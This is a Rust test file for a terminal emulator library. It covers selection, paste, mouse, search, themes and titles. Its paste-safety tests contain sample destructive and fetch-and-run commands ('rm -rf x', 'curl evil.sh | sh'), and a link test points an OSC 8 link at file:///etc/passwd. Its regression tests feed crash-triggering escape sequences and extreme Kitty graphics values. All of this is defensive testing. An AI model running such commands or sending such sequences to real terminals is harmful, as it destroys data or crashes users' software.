//! Drives the terminal thread through `TermHandle` the way the UI does.

use std::sync::mpsc::{Receiver, channel};
use std::time::Duration;

use shellwing_term::{
    Colors, Event, FindQuery, Found, Frame, LinkSpan, Mods, MouseAction, MouseButton, MouseInput,
    Rgb, TermHandle,
};

const CELL: (u32, u32) = (10, 20);

struct Harness {
    term: TermHandle,
    written: Receiver<Vec<u8>>,
    events: Receiver<Event>,
    woke: Receiver<()>,
}

fn harness() -> Harness {
    harness_keeping(100)
}

fn harness_keeping(scrollback: usize) -> Harness {
    let (wtx, written) = channel();
    let (etx, events) = channel();
    let (ktx, woke) = channel();
    let term = TermHandle::spawn(
        40,
        5,
        scrollback,
        Box::new(move |b| {
            let _ = wtx.send(b);
        }),
        Box::new(move || {
            let _ = ktx.send(());
        }),
        Box::new(move |e| {
            let _ = etx.send(e);
        }),
    )
    .expect("spawn");
    term.resize(40, 5, CELL.0, CELL.1);
    Harness {
        term,
        written,
        events,
        woke,
    }
}

impl Harness {
    /// Waits until a frame satisfying `pred` is built. Debug builds of
    /// libghostty parse slowly (seconds for a few thousand lines), so the
    /// wait is long; it only runs out when something is wrong.
    fn frame_where(&self, pred: impl Fn(&Frame) -> bool) -> Frame {
        let deadline = std::time::Instant::now() + Duration::from_secs(15);
        while std::time::Instant::now() < deadline {
            if let Some(f) = self.term.take_frame()
                && pred(&f)
            {
                return (*f).clone();
            }
            let _ = self.woke.recv_timeout(Duration::from_millis(20));
        }
        panic!("no matching frame");
    }

    fn row_text(f: &Frame, y: usize) -> String {
        f.rows[y].text.trim_end().to_string()
    }

    fn written_all(&self) -> Vec<u8> {
        std::thread::sleep(Duration::from_millis(50));
        self.written.try_iter().flatten().collect()
    }

    fn mouse(&self, action: MouseAction, x: f32, y: f32, mods: Mods) {
        self.term.mouse(MouseInput {
            action,
            button: Some(MouseButton::Left),
            x,
            y,
            mods,
            link: false,
        });
    }
}

#[test]
fn drag_selects_and_copy_returns_the_text() {
    let h = harness();
    h.term.feed(b"hello world\r\nsecond".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0) == "hello world");

    let none = Mods::default();
    // Drag across "hello" on the first row (cells 0..=4). Like Ghostty, the last
    // cell counts only once the pointer is past its middle, hence x = 48 in cell 4.
    h.mouse(MouseAction::Press, 1.0, 5.0, none);
    h.mouse(MouseAction::Motion, 48.0, 5.0, none);
    h.mouse(MouseAction::Release, 48.0, 5.0, none);
    let f = h.frame_where(|f| f.rows[0].runs.iter().any(|r| r.selected));
    assert!(
        f.rows[0].runs[0].selected,
        "selection is reported in the frame"
    );
    assert!(f.selected, "and that there is one, for the menu's Copy");

    h.term.copy();
    let copied = h
        .events
        .recv_timeout(Duration::from_secs(2))
        .expect("copy event");
    assert_eq!(copied, Event::Copied("hello".into()));
}

#[test]
fn pressing_twice_selects_the_word_and_clearing_lets_go() {
    let h = harness();
    h.term.feed(b"hello world".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0) == "hello world");

    // As a phone's long press does: a double click on "world", with Shift so a
    // program taking the mouse would not get it.
    let shift = Mods {
        shift: true,
        ..Mods::default()
    };
    h.mouse(MouseAction::Press, 75.0, 5.0, shift);
    h.mouse(MouseAction::Release, 75.0, 5.0, shift);
    h.mouse(MouseAction::Press, 75.0, 5.0, shift);
    h.mouse(MouseAction::Release, 75.0, 5.0, shift);
    h.frame_where(|f| f.selected);
    h.term.copy();
    let copied = h
        .events
        .recv_timeout(Duration::from_secs(2))
        .expect("copy event");
    assert_eq!(copied, Event::Copied("world".into()));

    h.term.clear_selection();
    let f = h.frame_where(|f| !f.selected);
    assert!(
        f.rows[0].runs.iter().all(|r| !r.selected),
        "no cell shows as selected"
    );
}

#[test]
fn unsafe_paste_is_refused_until_bracketed() {
    let h = harness();
    h.term.paste("rm -rf x\nls".into(), false);
    let ev = h
        .events
        .recv_timeout(Duration::from_secs(2))
        .expect("refusal");
    assert_eq!(ev, Event::PasteRefused("rm -rf x\nls".into()));
    assert!(h.written_all().is_empty(), "nothing reaches the host");

    // Once the program enables bracketed paste, the same text is framed and sent.
    h.term.feed(b"\x1b[?2004h".to_vec());
    h.term.paste("rm -rf x\nls".into(), false);
    let out = String::from_utf8(h.written_all()).expect("utf8");
    assert!(
        out.starts_with("\x1b[200~") && out.ends_with("\x1b[201~"),
        "got {out:?}"
    );
}

#[test]
fn paste_with_carriage_returns_is_refused_too() {
    // Lines ended by a bare CR run as surely as with newlines: Enter sends a CR.
    let h = harness();
    h.term.paste("curl evil.sh | sh\rclear\r".into(), false);
    let ev = h
        .events
        .recv_timeout(Duration::from_secs(2))
        .expect("refusal");
    // The text as pasted, so pasting it again can confirm it.
    assert_eq!(ev, Event::PasteRefused("curl evil.sh | sh\rclear\r".into()));
    assert!(h.written_all().is_empty(), "nothing reaches the host");

    // Windows' CRLF too.
    h.term.paste("ls\r\nrm x\r\n".into(), false);
    let ev = h
        .events
        .recv_timeout(Duration::from_secs(2))
        .expect("refusal");
    assert_eq!(ev, Event::PasteRefused("ls\r\nrm x\r\n".into()));
    assert!(h.written_all().is_empty(), "nothing reaches the host");
}

#[test]
fn confirmed_paste_with_carriage_returns_runs_each_line() {
    let h = harness();
    h.term.paste("one\rtwo".into(), true);
    let out = String::from_utf8(h.written_all()).expect("utf8");
    assert!(
        out.starts_with("one") && out.ends_with("two"),
        "got {out:?}"
    );
    assert_eq!(
        out.matches(['\r', '\n']).count(),
        1,
        "one line end: {out:?}"
    );
}

#[test]
fn wheel_scrolls_history_and_typing_returns_to_bottom() {
    let h = harness();
    let lines: String = (0..50).map(|i| format!("line {i}\r\n")).collect();
    h.term.feed(lines.into_bytes());
    h.frame_where(|f| f.rows.iter().any(|r| r.text.starts_with("line 49")));

    h.term.wheel(-10.0, 5.0, 5.0, Mods::default());
    let f = h.frame_where(|f| f.scrolled_back);
    assert!(
        f.cursor.is_none(),
        "the cursor is hidden while scrolled back"
    );

    h.term.text("x".into());
    h.frame_where(|f| !f.scrolled_back);
    assert_eq!(h.written_all(), b"x");
}

#[test]
fn mouse_goes_to_the_program_when_it_asks() {
    let h = harness();
    // SGR mouse reporting with button tracking, as htop or vim enable it.
    assert!(!h.frame_where(|_| true).mouse_tracking);
    h.term.feed(b"\x1b[?1000h\x1b[?1006h".to_vec());
    // The frame says so, for the right-click menu to step aside.
    h.frame_where(|f| f.mouse_tracking);
    h.mouse(MouseAction::Press, 25.0, 25.0, Mods::default());
    let out = String::from_utf8(h.written_all()).expect("utf8");
    // Cell (2, 1) in SGR is 1-based: column 3, row 2.
    assert_eq!(out, "\x1b[<0;3;2M");

    // Shift still selects instead of reporting.
    let shift = Mods {
        shift: true,
        ..Default::default()
    };
    h.mouse(MouseAction::Release, 25.0, 25.0, Mods::default());
    let _ = h.written_all();
    h.mouse(MouseAction::Press, 25.0, 25.0, shift);
    assert!(h.written_all().is_empty());

    h.term.feed(b"\x1b[?1000l".to_vec());
    h.frame_where(|f| !f.mouse_tracking);
}

#[test]
#[cfg_attr(
    debug_assertions,
    ignore = "dev builds compile libghostty in Zig's Debug mode; run with cargo test --release"
)]
fn frames_keep_coming_while_output_floods() {
    // Regression: a full input queue used to drop the UI's "frame taken" notice,
    // after which no frame was ever built again. Big chunks keep the parser busy so
    // the queue is full while frames are being taken.
    let h = harness();
    let term = h.term.clone();
    let line = format!("{}\r\n", "x".repeat(78));
    let chunk = line.repeat(800); // ~64 KB
    let feeder = std::thread::spawn(move || {
        for _ in 0..100 {
            term.feed(chunk.clone().into_bytes());
        }
        term.feed(b"the end\r\n".to_vec());
    });
    let deadline = std::time::Instant::now() + Duration::from_secs(20);
    let mut frames = 0;
    loop {
        if let Some(f) = h.term.take_frame() {
            frames += 1;
            if f.rows.iter().any(|r| r.text.starts_with("the end")) {
                break;
            }
        }
        assert!(
            std::time::Instant::now() < deadline,
            "frames stopped after {frames}"
        );
        std::thread::sleep(Duration::from_millis(2));
    }
    feeder.join().expect("feeder");
    assert!(
        frames > 1,
        "the screen updated during the flood, not only after it ({frames} frames)"
    );
}

#[test]
fn hovering_finds_a_printed_url() {
    let h = harness();
    h.term
        .feed(b"visit https://example.com/docs today".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0).starts_with("visit"));
    // Cell 10 is inside the URL (columns 6..30).
    h.term.hover(Some((105.0, 5.0)));
    let f = h.frame_where(|f| f.hover_link.is_some());
    assert_eq!(
        f.hover_link,
        Some(LinkSpan {
            row: 0,
            start: 6,
            end: 30
        })
    );
    h.term.hover(None);
    h.frame_where(|f| f.hover_link.is_none());
}

#[test]
fn link_click_opens_osc8_targets_but_not_unsafe_schemes() {
    let h = harness();
    // OSC 8: the visible text differs from the target.
    h.term.feed(b"\x1b]8;;https://ghostty.org/\x1b\\click me\x1b]8;;\x1b\\ \x1b]8;;file:///etc/passwd\x1b\\local\x1b]8;;\x1b\\".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0).starts_with("click me"));
    let click = |x: f32| {
        h.term.mouse(MouseInput {
            action: MouseAction::Press,
            button: Some(MouseButton::Left),
            x,
            y: 5.0,
            mods: Mods::default(),
            link: true,
        });
        h.term.mouse(MouseInput {
            action: MouseAction::Release,
            button: Some(MouseButton::Left),
            x,
            y: 5.0,
            mods: Mods::default(),
            link: true,
        });
    };
    click(25.0);
    assert_eq!(
        h.events.recv_timeout(Duration::from_secs(2)).ok(),
        Some(Event::OpenLink("https://ghostty.org/".into()))
    );
    click(105.0); // "local" -> file://, never opened
    assert!(h.events.recv_timeout(Duration::from_millis(300)).is_err());
}

#[test]
fn wide_glyphs_take_two_cells() {
    let h = harness();
    h.term.feed("a日本b".as_bytes().to_vec());
    let f = h.frame_where(|f| f.rows[0].text.starts_with("a日本b"));
    let runs: Vec<(u16, u16, bool)> = f.rows[0]
        .runs
        .iter()
        .take(4)
        .map(|r| (r.col, r.cells, r.wide))
        .collect();
    assert_eq!(runs[0], (0, 1, false));
    assert_eq!(runs[1], (1, 2, true));
    assert_eq!(runs[2], (3, 2, true));
    assert_eq!(
        runs[3].0, 5,
        "the run after the wide glyphs starts at column 5"
    );
}

fn theme(base: u8) -> Colors {
    let c = |v: u8| Rgb { r: v, g: v, b: v };
    let mut palette = [c(0); 16];
    palette[1] = Rgb {
        r: base,
        g: 0,
        b: 0,
    };
    Colors {
        foreground: c(base + 1),
        background: c(base + 2),
        cursor: c(base + 3),
        palette,
    }
}

#[test]
fn theme_colors_reach_text_already_on_screen() {
    let h = harness();
    h.term.feed(b"\x1b[31mred\x1b[0m plain".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0) == "red plain");

    h.term.set_colors(theme(100));
    let f = h.frame_where(|f| {
        f.background
            == Rgb {
                r: 102,
                g: 102,
                b: 102,
            }
    });
    let runs = &f.rows[0].runs;
    assert_eq!(
        runs[0].fg,
        Rgb { r: 100, g: 0, b: 0 },
        "ANSI red from the palette"
    );
    assert_eq!(
        runs[1].fg,
        Rgb {
            r: 101,
            g: 101,
            b: 101
        },
        "default foreground"
    );
    assert_eq!(runs[1].bg, None, "default background stays unpainted");
    assert_eq!(
        f.cursor_color,
        Some(Rgb {
            r: 103,
            g: 103,
            b: 103
        })
    );
}

#[test]
fn a_programs_color_override_survives_a_theme_change() {
    let h = harness();
    h.term.set_colors(theme(100));
    h.term.feed(b"\x1b]11;#102030\x1b\\x".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0) == "x");
    h.term.set_colors(theme(50));
    let f = h.frame_where(|f| {
        f.foreground
            == Rgb {
                r: 51,
                g: 51,
                b: 51,
            }
    });
    assert_eq!(
        f.background,
        Rgb {
            r: 0x10,
            g: 0x20,
            b: 0x30
        }
    );
}

#[test]
fn close_ends_the_thread_and_drops_its_callbacks() {
    let alive = std::sync::Arc::new(());
    let held = alive.clone();
    let term = TermHandle::spawn(
        10,
        3,
        10,
        Box::new(move |_| {
            let _ = &held;
        }),
        Box::new(|| {}),
        Box::new(|_| {}),
    )
    .expect("spawn");
    term.close();
    for _ in 0..100 {
        if std::sync::Arc::strong_count(&alive) == 1 {
            return;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    panic!("the write callback was not dropped");
}

fn cursor(f: &Frame) -> (u16, u16) {
    f.cursor.expect("cursor shown")
}

#[test]
fn resetting_modes_keeps_the_text_and_the_cursor() {
    let h = harness();
    h.term.feed(b"one\r\ntwo\r\n$ ".to_vec());
    let before = h.frame_where(|f| Harness::row_text(f, 2) == "$");
    assert_eq!(cursor(&before), (2, 2));
    h.term.reset_modes();
    h.term.feed(b"x".to_vec());
    let f = h.frame_where(|f| Harness::row_text(f, 2) == "$ x");
    assert_eq!(Harness::row_text(&f, 0), "one", "nothing is overwritten");
    assert_eq!(cursor(&f), (3, 2));
}

#[test]
fn resetting_modes_leaves_a_forgotten_alternate_screen() {
    let h = harness();
    h.term.feed(b"$ vim\r\n".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0) == "$ vim");
    // vim takes the alternate screen, then its connection dies.
    h.term.feed(b"\x1b[?1049h\x1b[2J\x1b[Hvim screen".to_vec());
    h.frame_where(|f| Harness::row_text(f, 0) == "vim screen");
    h.term.reset_modes();
    h.term.feed(b"back".to_vec());
    let f = h.frame_where(|f| Harness::row_text(f, 1) == "back");
    assert_eq!(
        Harness::row_text(&f, 0),
        "$ vim",
        "the shell's screen is back"
    );
}

#[test]
fn the_scroll_position_follows_history() {
    let h = harness();
    let lines: String = (0..30).map(|i| format!("line {i}\r\n")).collect();
    h.term.feed(lines.into_bytes());
    let f = h.frame_where(|f| f.scroll.total >= 30);
    assert_eq!(f.scroll.len, 5);
    assert_eq!(
        f.scroll.offset,
        f.scroll.total - f.scroll.len,
        "at the bottom"
    );
    h.term.scroll_to(0);
    let f = h.frame_where(|f| f.scroll.offset == 0);
    assert!(f.scrolled_back);
    assert_eq!(Harness::row_text(&f, 0), "line 0");
}

fn text(t: &str) -> FindQuery {
    FindQuery {
        text: t.into(),
        ..FindQuery::default()
    }
}

/// The text of each run marked `found`, after the start of its row.
fn marked(f: &Frame, found: Found) -> Vec<(String, String)> {
    let mut out = vec![];
    for row in &f.rows {
        let mut at = 0;
        for r in &row.runs {
            let text = &row.text[at..at + r.len];
            at += r.len;
            if r.found == found {
                let line = row.text.split(" needle").next().unwrap_or_default();
                out.push((line.to_string(), text.to_string()));
            }
        }
    }
    out
}

#[test]
fn find_marks_matches_and_walks_into_history() {
    let h = harness();
    // A needle on lines 3, 13 and 23; the screen shows the last few lines.
    let lines: String = (0..30)
        .map(|i| format!("line {i}{}\r\n", if i % 10 == 3 { " needle" } else { "" }))
        .collect();
    h.term.feed(lines.into_bytes());
    h.frame_where(|f| f.rows.iter().any(|r| r.text.starts_with("line 29")));

    // ASCII letters match in either case; the newest match is chosen, and
    // scrolled to.
    h.term.find(text("NEEDLE"));
    let f = h.frame_where(|f| {
        f.find
            .is_some_and(|s| s.total == 3 && s.current == Some(0) && !s.searching)
            && !marked(f, Found::Current).is_empty()
    });
    assert_eq!(
        marked(&f, Found::Current),
        [("line 23".to_string(), "needle".to_string())]
    );
    assert!(f.scrolled_back);

    // Enter goes up into history, Shift+Enter comes back down.
    h.term.find_next(true);
    let f = h.frame_where(|f| f.find.is_some_and(|s| s.current == Some(1)));
    let f = if marked(&f, Found::Current).is_empty() {
        h.frame_where(|f| !marked(f, Found::Current).is_empty())
    } else {
        f
    };
    assert_eq!(marked(&f, Found::Current)[0].0, "line 13");
    h.term.find_next(false);
    h.frame_where(|f| {
        f.find.is_some_and(|s| s.current == Some(0))
            && marked(f, Found::Current)
                .first()
                .is_some_and(|m| m.0 == "line 23")
    });

    // Empty text stops finding, and the marks go.
    h.term.find(FindQuery::default());
    let f = h.frame_where(|f| f.find.is_none());
    assert!(marked(&f, Found::Match).is_empty() && marked(&f, Found::Current).is_empty());
}

#[test]
fn history_keeps_the_lines_asked_for() {
    // libghostty's own default would keep about a thousand, whatever was asked.
    let h = harness_keeping(5000);
    let lines: String = (0..4000).map(|i| format!("line {i}\r\n")).collect();
    h.term.feed(lines.into_bytes());
    let f = h.frame_where(|f| f.rows.iter().any(|r| r.text.starts_with("line 3999")));
    assert!(f.scroll.total >= 4000, "kept {} rows", f.scroll.total);
}

/// Waits for a search to be done, and returns how it ended.
fn found(h: &Harness, query: FindQuery) -> Frame {
    h.term.find(query);
    h.frame_where(|f| f.find.is_some_and(|s| !s.searching))
}

#[test]
fn find_minds_case_when_asked_and_takes_regular_expressions() {
    let h = harness();
    h.term.feed(
        "Needle\r\nneedle\r\nNEEDLE 42\r\nviệt and VIỆT\r\n"
            .as_bytes()
            .to_vec(),
    );
    h.frame_where(|f| f.rows.iter().any(|r| r.text.starts_with("việt")));

    let total = |f: &Frame| f.find.map_or(0, |s| s.total);
    assert_eq!(total(&found(&h, text("needle"))), 3);
    let exact = FindQuery {
        text: "Needle".into(),
        match_case: true,
        regex: false,
    };
    assert_eq!(total(&found(&h, exact)), 1);
    // Case goes beyond ASCII: Vietnamese letters with their marks too.
    assert_eq!(total(&found(&h, text("Việt"))), 2);

    let regex = |t: &str| FindQuery {
        text: t.into(),
        match_case: false,
        regex: true,
    };
    let f = found(&h, regex(r"needle \d+"));
    assert_eq!(total(&f), 1);
    assert_eq!(marked(&f, Found::Current)[0].1, "NEEDLE 42");
    // Plain text is not a pattern: "." is a dot.
    assert_eq!(total(&found(&h, text("ne.dle"))), 0);
    h.term.find(regex("ne(dle"));
    h.frame_where(|f| f.find.is_some_and(|s| s.invalid));
}

#[test]
fn find_sees_matches_across_a_wrapped_row() {
    let h = harness();
    // 38 columns of x, then a needle that wraps after "ne" on a 40-column grid.
    h.term
        .feed(format!("{}needle\r\n", "x".repeat(38)).into_bytes());
    h.frame_where(|f| f.rows.iter().any(|r| r.text.starts_with("edle")));
    let f = found(&h, text("needle"));
    assert_eq!(f.find.map(|s| s.total), Some(1));
    let parts: Vec<String> = marked(&f, Found::Current)
        .into_iter()
        .map(|(_, part)| part)
        .collect();
    assert_eq!(parts, ["ne", "edle"]);
}

#[test]
fn find_follows_new_output() {
    let h = harness();
    let f = found(&h, text("needle"));
    assert_eq!(f.find.map(|s| s.total), Some(0));
    // Output that scrolls the first match up into history, then more.
    let lines: String = (0..20)
        .map(|i| format!("{i}{}\r\n", if i % 5 == 0 { " needle" } else { "" }))
        .collect();
    h.term.feed(lines.into_bytes());
    h.frame_where(|f| f.find.is_some_and(|s| s.total == 4 && !s.searching));
    // `clear` (the screen and the history): what it wiped is no longer found.
    h.term.feed(b"\x1b[2J\x1b[3J\x1b[H".to_vec());
    h.frame_where(|f| f.find.is_some_and(|s| s.total == 0 && !s.searching));
}

/// Written to memory, for reading back.
#[derive(Clone, Default)]
struct Sink(std::sync::Arc<std::sync::Mutex<Vec<u8>>>);

impl std::io::Write for Sink {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        self.0.lock().expect("sink").extend_from_slice(buf);
        Ok(buf.len())
    }
    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

fn all_text(h: &Harness, html: bool) -> String {
    let (tx, rx) = channel();
    h.term.format_all(
        html,
        Box::new(move |b| {
            let _ = tx.send(b);
        }),
    );
    let bytes = rx.recv_timeout(Duration::from_secs(2)).expect("text");
    String::from_utf8(bytes).expect("utf-8")
}

#[test]
fn a_log_gets_what_comes_while_it_is_on_and_all_the_text_can_be_had() {
    use shellwing_term::log::{Log, LogFormat};
    let h = harness();
    let sink = Sink::default();
    h.term.feed(b"before\r\n".to_vec());
    h.term.log(Some(Log::new(
        Box::new(sink.clone()),
        LogFormat::Text,
        None,
    )));
    h.term.feed(b"\x1b[32mlogged\x1b[0m\r\n$ ".to_vec());
    h.term.log(None);
    h.term.feed(b"after\r\n".to_vec());
    // Commands run in order: once the text comes, the log has ended.
    let all = all_text(&h, false);
    assert_eq!(all.trim_end(), "before\nlogged\n$ after");
    let logged = String::from_utf8(sink.0.lock().expect("sink").clone()).expect("utf-8");
    assert_eq!(logged, "logged\n$\n");
    let html = all_text(&h, true);
    assert!(html.contains("logged") && html.contains('<'), "{html}");
}

#[test]
fn a_title_the_program_sets_comes_as_an_event() {
    let h = harness();
    h.term.feed(b"\x1b]0;deploy@api-1: ~/apps\x07$ ".to_vec());
    let got = h
        .events
        .recv_timeout(Duration::from_secs(5))
        .expect("an event");
    match got {
        Event::Title(t) => assert_eq!(t, "deploy@api-1: ~/apps"),
        _ => panic!("not a title"),
    }
}

/// A title that is not UTF-8 is dropped (libghostty ignores it), and the
/// next one still comes. The binding hands titles over as bytes since Ghostty
/// 1.4; they are read lossily all the same.
#[test]
fn a_title_that_is_not_utf8_is_dropped_and_the_next_one_comes() {
    let h = harness();
    h.term
        .feed(b"\x1b]2;caf\xe9 \xff\x07\x1b]2;deploy@api-1\x07$ ".to_vec());
    let got = h
        .events
        .recv_timeout(Duration::from_secs(5))
        .expect("an event");
    match got {
        Event::Title(t) => assert_eq!(t, "deploy@api-1"),
        _ => panic!("not a title"),
    }
}

/// Waits, longer than [`Harness::frame_where`], for `text` on the screen:
/// what is fed before it is slow to parse in a debug build.
fn shows_after_a_while(h: &Harness, text: &str) {
    let deadline = std::time::Instant::now() + Duration::from_secs(120);
    while std::time::Instant::now() < deadline {
        if let Some(f) = h.term.take_frame()
            && f.rows.iter().any(|r| r.text.contains(text))
        {
            return;
        }
        let _ = h.woke.recv_timeout(Duration::from_millis(50));
    }
    panic!("{text:?} never showed: the terminal stopped");
}

/// Writes rows and clears them into history (`CSI 22 J`) over and over, a
/// varying number at a time, with the cursor at the top of the screen and
/// given `start` (a style, a link) before each clear. With no history kept,
/// libghostty drops its oldest page at a clear; sooner or later that is the
/// page the cursor is on, whatever a page holds.
fn clear_into_no_history(start: &str, end: &str) {
    let h = harness_keeping(0);
    let mut out = String::new();
    for i in 0..400 {
        for _ in 0..i % 5 {
            out.push_str("x\r\n");
        }
        out.push_str("x\x1b[H");
        out.push_str(start);
        out.push_str("\x1b[22Jy");
        out.push_str(end);
        out.push_str("\r\n");
    }
    out.push_str("\r\nstill here");
    h.term.feed(out.into_bytes());
    shows_after_a_while(&h, "still here");
}

/// A clear that dropped the cursor's page left the cursor with that page's
/// style, which then reached into another page's styles: a crash in a debug
/// build of libghostty before Ghostty 1.4.0 (GHSA-w9q4-5jvv-mcv4). A host can
/// send it; `scrollback = 0` keeps no history.
#[test]
fn clearing_into_no_history_with_a_styled_cursor_goes_on() {
    clear_into_no_history("\x1b[1;4;31m", "\x1b[0m");
}

/// The same with a link (OSC 8) on the cursor, whose ID is per page too.
#[test]
fn clearing_into_no_history_with_a_linked_cursor_goes_on() {
    clear_into_no_history("\x1b]8;;https://example.com/\x1b\\", "\x1b]8;;\x1b\\");
}

/// Kitty graphics commands with the largest sizes and offsets the protocol
/// carries, which a host can send. Such numbers once went into unchecked
/// arithmetic: a crash in a debug build, wrapped sizes in a release one, or
/// the cursor moved for ever (GHSA-mhff-mv4q-fp63). Ghostty fixed that in
/// August 2026, before the commit shellwing used until 1.4.0; this keeps an
/// update from bringing it back.
#[test]
fn kitty_graphics_with_extreme_numbers_leave_the_terminal_working() {
    let h = harness();
    let (max, imax, imin) = (u32::MAX, i32::MAX, i32::MIN);
    // One red RGB pixel, base64.
    let pixel = "/wAA";
    let commands = [
        // Placed over more columns and rows than there are, the cursor
        // moving past them.
        format!("a=T,f=24,s=1,v=1,c={max},r={max};{pixel}"),
        format!("a=T,f=24,s=1,v=1,X={max},Y={max};{pixel}"),
        format!("a=T,f=24,s=1,v=1,x={max},y={max},w={max},h={max};{pixel}"),
        format!("a=T,f=24,s=1,v=1,z={imin},C=1;{pixel}"),
        // Sizes whose product wraps, for a pixel's worth of data.
        format!("a=T,f=24,s={max},v={max};{pixel}"),
        format!("a=T,f=32,s=65536,v=65536;{pixel}"),
        // An image kept, then placed relative to a placement of its own.
        format!("a=t,f=24,s=1,v=1,i=7;{pixel}"),
        "a=p,i=7,p=1".to_string(),
        format!("a=p,i=7,p=2,P=7,Q=1,H={imax},V={imax}"),
        format!("a=p,i=7,p=3,P=7,Q=1,H={imin},V={imin}"),
        format!("a=p,i=7,p=4,c={max},r={max}"),
        // Deleting by a cell far off the screen.
        format!("a=d,d=p,x={max},y={max}"),
    ];
    let mut out = String::new();
    for c in &commands {
        out.push_str(&format!("\x1b_G{c}\x1b\\"));
    }
    out.push_str("\r\nstill here");
    h.term.feed(out.into_bytes());
    shows_after_a_while(&h, "still here");
}
